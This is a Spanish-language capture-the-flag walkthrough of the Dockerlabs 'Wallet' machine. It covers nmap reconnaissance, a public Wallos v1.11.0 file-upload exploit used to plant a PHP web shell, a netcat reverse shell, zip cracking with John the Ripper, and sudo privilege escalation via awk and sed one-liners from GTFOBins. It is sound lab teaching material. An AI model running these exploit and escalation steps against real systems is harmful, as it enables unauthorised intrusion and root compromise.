## Wallet
### Plataforma: Dockerlabs
### Nivel: Medio
### url: https://dockerlabs.es/
##
### WriteUp realizado por afgsanchez: https://afgsanchez.pythonanywhere.com/
##

Vamos al grano...
```
└─# ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.128 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.128/0.128/0.128/0.000 ms
    
```
Uso nmap para localizar puertos y servicios abiertos.

```
└─# nmap -p- 172.17.0.2 -n -Pn -vvv -sS --min-rate 4000
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-13 19:58 CEST
Initiating ARP Ping Scan at 19:58
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 19:58, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 19:58
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 19:58, 0.53s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000040s latency).
Scanned at 2024-07-13 19:58:23 CEST for 1s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.74 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)

```
Tenemos una web en el puerto 80

![image](https://github.com/user-attachments/assets/eed0fb58-c7fd-447b-b8ff-c0404cbde2f1)


Es una simple pagina estatica, pero hay un boton que tiene un enlace. Lo investigo porque el resto de la pagina no tiene nada.

```
   Manage your subscriptions easily!
                    </p>
                    <div class="btn-box">
                      <a href="http://panel.wallet.dl" class="btn-2">
                        Get A Quote
                      </a>
```
Intento navegar directamente pero no funciona así que decido añadirlo a mi archivo /etc/hosts

```
└─# nano /etc/hosts 

127.0.0.1       localhost
127.0.1.1       kali
172.17.0.2      panel.wallet.dl
```
Ahora sí.

Es una aplicacion web que me permite crear una cuenta.
No conozco la aplicación, así que decido crear una cuenta para averiguar que puedo hacer.


Creo una cuenta con datos al azar

![image](https://github.com/user-attachments/assets/2e90b305-67a1-41da-b600-004dc1b34572)



Inicio sesion y examinamos la aplicacion.

![image](https://github.com/user-attachments/assets/6e5d006b-0c7b-4170-a0a1-e632eb3ecc0c)


Interesante: Aplicacion Wallos version v1.11.0

![image](https://github.com/user-attachments/assets/160f87ba-51b7-4fa6-a869-235876321a40)

Busco por internet si existe algun exploit para esta version.

![image](https://github.com/user-attachments/assets/5158f13b-a9a9-4857-b831-124639107cc0)


```
https://sploitus.com/exploit?id=EDB-ID:51924
```


Sigo las instrucciones del POC

![image](https://github.com/user-attachments/assets/52b20aab-0059-48ad-ba5f-9eb60fefa0c6)

![image](https://github.com/user-attachments/assets/816f75a1-139a-45d0-a506-944427e04075)



Intercepto la peticion con burpsuite
![image](https://github.com/user-attachments/assets/67de6308-4695-4cb3-ae8c-0424656eef3f)



Así me queda la peticion:
![image](https://github.com/user-attachments/assets/b20a8df7-a491-4c26-96d5-36c95c5d8cbc)




Se ha creado el objeto con nuestra webshell
![image](https://github.com/user-attachments/assets/e6b0dc10-0d90-42e4-8480-3a9f85cb3e31)



Ahora hay que ejecutarlo.
Deasctivo Burpsuite.
Pongo netcat a la escucha

```
└─# nc -nlvp 4444      
listening on [any] 4444 …
```

Y sigo las instrucciones del exploit:

```
5) You will get the response that your file was uploaded ok:

{"status":"Success","message":"Subscription updated successfully"}


6) Your file will be located in:
http://VICTIM_IP/images/uploads/logos/XXXXXX-yourshell.php

```
![image](https://github.com/user-attachments/assets/67632a33-e8a7-4172-9089-3d4e306c08dc)



Hago click en mi shell. (1720895143-test.php)


```
└─# nc -nlvp 4444      
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 50294
Linux b24b67d706ea 6.6.15-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.6.15-2kali1 (2024-05-17) x86_64 GNU/Linux
 18:34:02 up  1:20,  0 user,  load average: 0.31, 0.42, 0.51
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (24): Inappropriate ioctl for device
bash: no job control in this shell
www-data@b24b67d706ea:/$ 
```
Estamos dentro!!

Vamos a probar lo básico:

```
www-data@b24b67d706ea:/$ sudo -l
sudo -l
Matching Defaults entries for www-data on b24b67d706ea:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on b24b67d706ea:
    (pylon) NOPASSWD: /usr/bin/awk
www-data@b24b67d706ea:/$ 

```

Ok. vemos que podemos ejecutar como el usuario pylon sin password el comando /usr/bin/awk

No estoy familiarizado con awk, así que busco info y encuentro esto:

```
¿QUÉ NOS PERMITE REALIZAR EL COMANDO AWK?
Los usos básicos que podemos dar al comando Awk son los siguientes:
    1. Buscar palabras y patrones de palabras y reemplazarlos por otras palabras y/o patrones.
    2. Hacer operaciones matemáticas.
    3. Procesar texto y mostrar las líneas y columnas que cumplen con determinadas condiciones.
    4. Etc.
Nota: En términos generales el comando awk permite procesar y modificar el texto según nuestras necesidades.
```
No me sirve de mucho, asi que voy a ver en GTFOBins.






```
.. / awk 

Shell
It can be used to break out from restricted environments by spawning an interactive system shell.
      awk 'BEGIN {system("/bin/sh")}'
```

Pues vamos a ello:

```
www-data@b24b67d706ea:/home$ sudo -u pylon /usr/bin/awk 'BEGIN {system("/bin/bash")}'                               
<-u pylon /usr/bin/awk 'BEGIN {system("/bin/bash")}'                                                                
ls                                                                                                                  
pinguino                                                                                                            
pylon                                                                                                               
whoami                                                                                                              
pylon                                                                                                               
         
```
Somos pylon!

```
script /dev/null -c bash
Script started, output log file is '/dev/null'.
pylon@b24b67d706ea:/home$ 

pylon@b24b67d706ea:/home$ whoami  
whoami
pylon

```

```
pylon@b24b67d706ea:/home$ cd pylon
cd pylon
pylon@b24b67d706ea:~$ ls
ls
secretitotraviesito.zip

```

Pruebo al azar por si suena la flauta ;)

```
pylon@b24b67d706ea:~$ unzip secretitotraviesito.zip
unzip secretitotraviesito.zip
Archive:  secretitotraviesito.zip
[secretitotraviesito.zip] notitachingona.txt password: chocolate

password incorrect--reenter: 

   skipping: notitachingona.txt      incorrect password
pylon@b24b67d706ea:~$ 

```
No hay suerte


Tengo que pasar el archivo a mi maquina atacante para decodificarlo.
No tengo muchas opciones, asi que investigo y hago lo siguiente:

```
pylon@b24b67d706ea:~$ base64 secretitotraviesito.zip > archivo.zip.b6
base64 secretitotraviesito.zip > archivo.zip.b6
pylon@b24b67d706ea:~$ ls
ls
archivo.zip.b6

```
```
pylon@b24b67d706ea:~$ cat archivo.zip.b6
cat archivo.zip.b6
UEsDBBQACQAIAOdC7FiFVsOKIQAAABkAAAASABwAbm90aXRhY2hpbmdvbmEudHh0VVQJAAPx55Bm
8eeQZnV4CwABBOgDAAAE6AMAAJQl5oY0Dvf43JObusEOgH5BrIiUqdx+by9DgXMhrefNolBLBwiF
VsOKIQAAABkAAABQSwECHgMUAAkACADnQuxYhVbDiiEAAAAZAAAAEgAYAAAAAAABAAAApIEAAAAA
bm90aXRhY2hpbmdvbmEudHh0VVQFAAPx55BmdXgLAAEE6AMAAAToAwAAUEsFBgAAAAABAAEAWAAA
AH0AAAAAAA==
```

Copio el base64 a un archivo en mi maquina kali:

```
└─# nano archivo_decodificado.zip.b64
  GNU nano 8.0                                archivo_decodificado.zip.b64                                          
UEsDBBQACQAIAOdC7FiFVsOKIQAAABkAAAASABwAbm90aXRhY2hpbmdvbmEudHh0VVQJAAPx55Bm
8eeQZnV4CwABBOgDAAAE6AMAAJQl5oY0Dvf43JObusEOgH5BrIiUqdx+by9DgXMhrefNolBLBwiF
VsOKIQAAABkAAABQSwECHgMUAAkACADnQuxYhVbDiiEAAAAZAAAAEgAYAAAAAAABAAAApIEAAAAA
bm90aXRhY2hpbmdvbmEudHh0VVQFAAPx55BmdXgLAAEE6AMAAAToAwAAUEsFBgAAAAABAAEAWAAA
AH0AAAAAAA==

```
Guardo los cambios.





Y ahora decodifico el archivo base64

```
─# base64 -d archivo_decodificado.zip.b64 > archivo_decodificado.zip

```
Ahora ya tengo el archivo zip en mi maquina

Toca crackearlo con John the ripper:

```
└─# zip2john archivo_decodificado.zip > hash                             
ver 2.0 efh 5455 efh 7875 archivo_decodificado.zip/notitachingona.txt PKZIP Encr: TS_chk, cmplen=33, decmplen=25, crc=8AC35685 ts=42E7 cs=42e7 type=8
                                                                                                                    
┌──(root㉿kali)-[/home/kali/Desktop/dockerlabs/wallet]
└─# john hash --wordlist=/usr/share/wordlists/rockyou.txt         
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 20 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
chocolate1       (archivo_decodificado.zip/notitachingona.txt)     
1g 0:00:00:00 DONE (2024-07-13 21:35) 100.0g/s 4096Kp/s 4096Kc/s 4096KC/s d1ad7c0a3805955a35eb260dab4180dd..lovegood
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```
Ya tenemos el password del archivo zip: chocolate1

```
└─# unzip archivo_decodificado.zip
Archive:  archivo_decodificado.zip
[archivo_decodificado.zip] notitachingona.txt password: 
  inflating: notitachingona.txt      
                                                                                                                    
┌──(root㉿kali)-[/home/kali/Desktop/dockerlabs/wallet]
└─# cat notitachingona.txt                                                                           
pinguino:pinguinomaloteh

```

Bien. Tenemos usuario y password del usuario pinguino.
Volvamos a la maquina y cambiemos al usuario pinguino:

```
pylon@b24b67d706ea:~$ su pinguino
su pinguino
Password: pinguinomaloteh

pinguino@b24b67d706ea:/home/pylon$ whoami
whoami
pinguino

```

Probamos de nuevo lo basico: sudo -l

```
pinguino@b24b67d706ea:/home/pylon$ sudo -l
sudo -l
Matching Defaults entries for pinguino on b24b67d706ea:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User pinguino may run the following commands on b24b67d706ea:
    (ALL) NOPASSWD: /usr/bin/sed

```
Perfecto, podemos ejecutar sin password y con todos los permisos el comando /usr/bin/sed.

Consultamos GTFOBins y nos dice lo siguiente:

```
sudo sed -n '1e exec sh 1>&0' /etc/hosts

```

Vamos a probar….

```
pinguino@b24b67d706ea:/home/pylon$ sudo /usr/bin/sed -n '1e exec sh 1>&0' /etc/hosts
<$ sudo /usr/bin/sed -n '1e exec sh 1>&0' /etc/hosts
# whoami
whoami
root

```
PWNED!!
